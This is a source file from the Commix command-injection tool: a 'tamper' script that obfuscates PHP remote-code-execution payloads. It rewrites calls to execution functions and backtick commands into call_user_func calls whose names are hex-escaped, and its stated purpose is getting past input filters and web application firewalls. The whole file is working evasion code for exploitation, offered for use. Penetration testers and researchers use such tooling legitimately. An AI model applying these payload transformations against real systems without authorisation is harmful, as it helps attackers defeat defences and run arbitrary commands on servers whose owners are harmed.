#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
from src.utils import settings
from src.core.controller import checks

r"""
About: Runs the command through a PHP function named in hex ("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63").
Notes: This tamper script works against target(s) evaluating PHP (i.e. option '--eval=php').
References: [1] https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/
"""

__tamper__ = "phphexname"
__priority__ = settings.PRIORITY.HIGH

# Why this script cannot be applied to the target at hand, or nothing where it can.
def dependencies():
  return checks.tamper_dep_command_incompatible(__tamper__) or checks.tamper_dep_grammar_only(__tamper__, "php")

"""
The call the name is handed to, rather than being written where the call is.

A payload here reaches PHP inside a string it is interpolated into, and what that allows is a
call by name, not a call on an expression - '("sys"."tem")(...)' does not parse there, while a
name passed as an argument does. The leading backslash names the global function, so a namespace
of the target's own cannot answer in its place.
"""
CALL_BY_NAME = "\\call_user_func("

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

# The name as the escapes PHP reads back as that name, leaving no letter of it in the payload.
def _hex_name(name):
  return "\"" + "".join("\\x%02x" % ord(char) for char in name) + "\""

"""
The command the backticks were running, as a string for the call to be handed.

Single quotes, because PHP reads a variable out of a double-quoted string and these commands carry
'${...}' of their own, which would be spent on the way rather than reaching the shell.
"""
def _quoted_command(command):
  return "'" + command.replace("\\", "\\\\").replace("'", "\\'") + "'"

# What the backtick operator is underneath, so naming it runs the command the backticks ran.
BACKTICK_FUNCTION = "shell_exec"
BACKTICK_COMMAND = r"`([^`]*)`"

# Run the command through a function named in hex, wherever the payload runs one.
def tamper(payload):
  for name in settings.EXECUTION_FUNCTIONS_LVL3:
    # Only where the name opens a call of its own, so a longer name carrying a shorter one is not
    # rewritten from the middle - and the call's own closing bracket still closes the new one.
    # A lambda, so that the backslashes the replacement is made of stay backslashes.
    called = CALL_BY_NAME + _hex_name(name) + ","
    payload = re.sub(r"(?<![\w\\])" + re.escape(name) + r"\(", lambda x: called, payload)
  # The boundary a payload most often arrives on names no function at all - it runs the command in
  # backticks, which is this function wearing punctuation, and reads the same way once named.
  return re.sub(BACKTICK_COMMAND,
                lambda x: CALL_BY_NAME + _hex_name(BACKTICK_FUNCTION) + "," + _quoted_command(x.group(1)) + ")",
                payload)

# eof
